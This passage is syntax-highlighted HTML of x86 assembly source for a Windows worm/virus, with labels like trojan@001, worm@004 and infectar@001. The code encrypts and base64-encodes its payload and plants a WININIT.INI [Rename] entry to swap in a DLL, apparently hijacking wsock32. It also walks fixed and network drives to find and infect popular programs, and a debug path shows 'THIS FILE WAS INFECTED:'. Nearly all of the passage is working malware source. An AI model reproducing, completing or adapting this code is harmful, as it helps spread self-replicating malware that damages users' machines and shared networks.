   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">convert@005</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0e8h</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">trojan@002</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">trojan@001</span><span class="sc4">)</span><span class="sc0">

   </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">_winsock.INC</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">raw</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@004</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">trojan@002</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">trojan@001</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

   </span><span class="sc1">; convert SABi¡-II to base64</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@011</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fsize</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">BASE64</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@004</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">raw</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@002</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rnd_crypt</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">trojan@001</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">NETCRYPT</span><span class="sc0">

   </span><span class="sc6">lodsd</span><span class="sc0">
   </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">stosd</span><span class="sc0">

   </span><span class="sc5">wsock32_crypt_partial</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">lodsd</span><span class="sc0">
   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">stosd</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
   </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">wsock32_crypt_partial</span><span class="sc0">

   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

   </span><span class="sc1">; resultado em eax</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dword_wsock_de</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">trojan@001</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dword_wsock_de2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">trojan@001</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">   </span><span class="sc1">;   change keys</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_GetWindowsDirectoryA</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'INI.'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'TINI'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc13">'NIW\'
</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0">
   </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">WININIT</span><span class="sc0">

   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">   </span><span class="sc1">;   CREATE_ALWAYS</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_CreateFileA</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">wsock32@006</span><span class="sc0">

   </span><span class="sc1">; [Rename],13,10</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0a0dh</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">']ema'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'neR['</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write_file</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">3</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@001</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_lstrlen</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc12">'LLD.'</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc12">'---.'</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'='</span><span class="sc0">
   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write_file</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@006</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_lstrlen</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write_file</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_CloseHandle</span><span class="sc0">

   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc5">wsock32@006</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">MAX_PATH</span><span class="sc0">

   </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0"> </span><span class="sc9">EQ</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@001</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_lstrlen</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@001</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@wsock</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'THIS FILE WAS INFECTED:'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">@wsock</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@006</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_MessageBoxA</span><span class="sc0">

   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc5">wsock32@001</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">w_IOB@001</span><span class="sc0">

   </span><span class="sc5">wsock32@005</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">write_file</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">   </span><span class="sc1">;   number of bytes to write</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_WriteFile</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">wsock32@002</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">wsock32@001</span><span class="sc0">

   </span><span class="sc5">mem</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">mem</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">api_txt_all</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_GetProcAddress</span><span class="sc0">
   </span><span class="sc6">stosd</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">wsock32@002</span><span class="sc0">

   </span><span class="sc5">api_txt_zero</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">lodsb</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">api_txt_zero</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">api_txt_all</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">worm@003</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

   </span><span class="sc5">worm@004</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

   </span><span class="sc1">;   Looking for net/comun programs</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'LLD.'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'PLHE'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'GAMI'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_LoadLibraryA</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">IMAGEHLP</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">worm@004_no_unl</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'e'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'liFr'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'oFee'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'rThc'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'raeS'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_GetProcAddress</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">5</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ap_SearchTreeForFile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">worm@004_unl</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@004</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4096</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_GetLogicalDriveStringsA</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">worm@004_unl</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4096</span><span class="sc0">
   </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">worm@004_unl</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@004</span><span class="sc0">

   </span><span class="sc5">nxt_string1</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_GetDriveTypeA</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DRIVE_FIXED</span><span class="sc0">
   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">worm@004_pop_prog</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DRIVE_REMOTE</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">nxt_string2</span><span class="sc0">

   </span><span class="sc5">worm@004_pop_prog</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_SetCurrentDirectoryA</span><span class="sc0">

   </span><span class="sc1">;   Infect some popular prog's</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">array@001</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">array@002</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">array@001</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">

   </span><span class="sc5">comun@003</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">cld</span><span class="sc0">
   </span><span class="sc6">lodsd</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@001</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ap_SearchTreeForFile</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">comun@004</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">infectar@001</span><span class="sc0">

   </span><span class="sc5">comun@004</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">comun@003</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
